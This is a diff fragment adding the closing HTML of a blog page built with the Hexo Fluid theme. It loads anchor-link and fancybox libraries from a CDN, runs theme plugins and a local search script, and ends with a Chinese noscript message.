+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
